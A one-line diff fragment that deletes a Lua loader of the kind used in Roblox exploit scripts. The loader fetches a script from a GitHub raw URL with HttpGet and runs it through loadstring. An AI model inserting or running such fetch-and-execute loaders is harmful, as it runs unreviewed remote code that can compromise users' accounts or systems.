@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IrishBaker/scripts/main/A-888/resource.lua"))()
